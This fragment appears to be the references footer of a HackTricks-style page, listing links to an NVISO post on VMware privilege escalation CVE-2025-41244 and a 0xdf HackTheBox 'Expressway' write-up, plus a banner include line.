- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)

{{#include ../../banners/hacktricks-training.md}}
